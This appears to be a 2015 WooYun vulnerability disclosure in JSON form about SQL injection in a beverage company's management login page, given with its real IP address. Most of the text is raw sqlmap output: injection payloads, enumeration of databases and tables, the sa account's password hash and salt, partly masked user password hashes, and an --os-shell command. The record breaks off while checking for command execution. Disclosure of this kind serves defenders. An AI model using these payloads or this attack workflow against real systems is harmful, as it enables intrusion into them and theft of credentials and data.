{"id": 68682, "wybug_id": "wooyun-2015-0140974", "wybug_title": "华润雪花某处管理系统注入导致多个数据库泄露（--os-shell已入内网）", "wybug_corp": "华润饮料(控股)有限公司", "wybug_author": "jianFen", "wybug_date": "2015-09-14 10:06", "wybug_open_date": "2015-10-29 11:22", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["内部数据库泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向公众公开  简要描述： - - 详细说明：  http://221.237.153.42:10002/Forms/Log.aspx\n\n\nsqlmap identified the following injection points with a total of 625 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---available databases [12]:[*] fgssccrbsp_jx_JX12[*] fgssccrbsp_xa_XA12[*] fgssccrbsp_yn_YN12[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] SCRBSP_JX[*] SCRBSP_XA[*] scrbsp_YN[*] tempdbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---current user:    'sa'available databases [12]:[*] fgssccrbsp_jx_JX12[*] fgssccrbsp_xa_XA12[*] fgssccrbsp_yn_YN12[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] SCRBSP_JX[*] SCRBSP_XA[*] scrbsp_YN[*] tempdbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---current user:    'sa'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---database management system users password hashes:[*] BUILTIN\\\\Administrators [1]:    password hash: NULL[*] sa [1]:    password hash: 0x01003515ca73fda16ca89ee3fc21dd57b2e149476853354136d896527a1cd045ab55d52e99226c8400294bf48c8a        header: 0x0100        salt: 3515ca73        mixedcase: fda16ca89ee3fc21dd57b2e149476853354136d8        uppercase: 96527a1cd045ab55d52e99226c8400294bf48c8asqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---current user:    'sa'current database:    'SCRBSP_JX'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---database management system users password hashes:[*] BUILTIN\\\\Administrators [1]:    password hash: NULL[*] sa [1]:    password hash: 0x01003515ca73fda16ca89ee3fc21dd57b2e149476853354136d896527a1cd045ab55d52e99226c8400294bf48c8a        header: 0x0100        salt: 3515ca73        mixedcase: fda16ca89ee3fc21dd57b2e149476853354136d8        uppercase: 96527a1cd045ab55d52e99226c8400294bf48c8asqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---current user is DBA:    Falsesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---available databases [12]:[*] fgssccrbsp_jx_JX12[*] fgssccrbsp_xa_XA12[*] fgssccrbsp_yn_YN12[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] SCRBSP_JX[*] SCRBSP_XA[*] scrbsp_YN[*] tempdbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---Database: SCRBSP_JX[66 tables]+------------------------------+| dbo.Exp_Bmb                  || dbo.Exp_Bmfy                 || dbo.Exp_Bmfy_Ot              || dbo.Exp_Kmb                  || dbo.Exp_Kmb_Ot               || dbo.Exp_Other                || dbo.Exp_OtherXl              || dbo.Exp_Qyfy                 || dbo.Exp_Shfy                 || dbo.Exp_tempFY               || dbo.FMS_PS_back              || dbo.FMS_blank                || dbo.FMS_customer             || dbo.FMS_fp                   || dbo.FMS_gl                   || dbo.FMS_gl_small             || dbo.FMS_moudle               || dbo.FMS_rele                 || dbo.FMS_sk                   || dbo.FMS_unit                 || dbo.GL                       || dbo.PriceTemp                || dbo.VIEW1                    || dbo.dtproperties             || dbo.plan_area                || dbo.plan_cxjhb               || dbo.plan_ditch               || dbo.plan_execplan            || dbo.plan_group               || dbo.plan_hall_product        || dbo.plan_hallrequire         || dbo.plan_headship            || dbo.plan_makeplan            || dbo.plan_merchant            || dbo.plan_merchant_package    || dbo.plan_merchant_product    || dbo.plan_merchant_product_CX || dbo.plan_merchant_right      || dbo.plan_merchant_two        || dbo.plan_message             || dbo.plan_moudle              || dbo.plan_moudle_fgs          || dbo.plan_package             || dbo.plan_product             || dbo.plan_product_lower       || dbo.plan_product_lower_cp    || dbo.plan_product_lower_sh    || dbo.plan_product_size        || dbo.plan_rights              || dbo.plan_subcompany          || dbo.plan_temp_price          || dbo.plan_users               || dbo.plan_xzarea              || dbo.sys_msgusers             || dbo.sys_trainyfstyle         || dbo.sysconstraints           || dbo.syssegments              || dbo.ticket_BckFtbl           || dbo.ticket_BckQd             || dbo.ticket_bottlestyle       || dbo.ticket_boxplan           || dbo.ticket_boxstatus         || dbo.ticket_fylx              || dbo.ticket_movezb            || dbo.ticket_policy            || dbo.view_merchant_product    |+------------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---Database: SCRBSP_JXTable: dbo.sys_msgusers[6 columns]+--------------+---------+| Column       | Type    |+--------------+---------+| id           | bigint  || name         | varchar || officephone  | varchar || privatephone | varchar || subcompany   | int     || zy           | varchar |+--------------+---------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---Database: SCRBSP_JXTable: dbo.plan_users[11 columns]+--------------+---------+| Column       | Type    |+--------------+---------+| email        | char    || fullname     | char    || headship     | bigint  || id           | int     || ingroup      | bigint  || insubdept    | bigint  || memo         | varchar || name         | char    || officephone  | char    || password     | varchar || privatephone | char    |+--------------+---------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: TxtUseName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' AND 5051=CONVERT(INT,(CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (5051=5051) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58))) AND 'oqfD'='oqfD    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=938158&TxtDataYear=scrbsp_JX&Sel_DataYear=scrbsp_JX&TxtUseName=renxiaoming' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(103)+CHAR(111)+CHAR(108)+CHAR(58)+CHAR(112)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(108)+CHAR(85)+CHAR(119)+CHAR(76)+CHAR(112)+CHAR(83)+CHAR(58)+CHAR(106)+CHAR(113)+CHAR(111)+CHAR(58), NULL-- ---Database: SCRBSP_JXTable: dbo.plan_users[13 entries]+----+----------------------------------+| id | password                         |+----+----------------------------------+| 13 | 1D7B59329DC********9B1F3AD2E8E43 || 14 | E10ADC3949B********E057F20F883E || 15 | EA678A81C2F********B9AB5938371665 || 16 | E10ADC3949B********6E057F20F883E || 19 | 4A2F86115F********E298DB16204A328 || 20 | 39BC2CBB426********D4F9E7C92F5D95 || 21 | FFDFFD816EB********0DAD835F9AE || 22 | C3336770********C61DED352059 || 23 | E10ADC394********E057F20F883E || 24 | B783C8B81********B192F736 || 25 | EA678A81********71665 || 26 | 670B14728A********A4F6BD || 6  | EA678A8********BD7B7B9AB********371665 |+----+----------------------------------+\n第二处注入: 可--os-shellhttp://221.237.153.42:10200/Forms/Login.aspx 只是端口不一样同第一处但是提权成功\nsqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:---Parameter: TxtUseName (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123' AND 1781=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1781=1781) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'ptag'='ptag    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(71)+CHAR(76)+CHAR(76)+CHAR(118)+CHAR(108)+CHAR(105)+CHAR(122)+CHAR(111)+CHAR(104)+CHAR(110)+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113),NULL,NULL,NULL-----[22:04:25] [INFO] testing Microsoft SQL Server[22:04:26] [INFO] confirming Microsoft SQL Server[22:04:27] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[22:04:27] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 35 times[22:04:27] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\221.237.153.42'[*] shutting down at 22:04:27C:\\Users\\Administrator>python C:\\Users\\Administrator\\Desktop\\sqlmapproject-sqlmap-aee4c93\\sqlmap.py -r C:\\Users\\Administrator\\Desktop\\sqlmapproject-sqlmap-aee4c93\\1.txt -p TxtUseName --os-shell         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150906}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:04:33[22:04:33] [INFO] parsing HTTP request from 'C:\\Users\\Administrator\\Desktop\\sqlmapproject-sqlmap-aee4c93\\1.txt'[22:04:33] [INFO] resuming back-end DBMS 'microsoft sql server'[22:04:33] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: TxtUseName (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123' AND 1781=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1781=1781) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'ptag'='ptag    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: TxtPassword=123&TxtDataYear=fgssccrbsp_jx_JX12&Sel_DataYear=fgssccrbsp_jx_JX12&TxtUseName=123' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(71)+CHAR(76)+CHAR(76)+CHAR(118)+CHAR(108)+CHAR(105)+CHAR(122)+CHAR(111)+CHAR(104)+CHAR(110)+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113),NULL,NULL,NULL-----[22:04:34] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[22:04:34] [INFO] fingerprinting the back-end DBMS operating system version andservice pack[22:04:36] [INFO] the back-end DBMS operating system is Windows 2003 Service Pack 2[22:04:37] [INFO] testing if current user is DBA[22:04:37] [INFO] checking if xp_cmdshell extended procedure is available, please 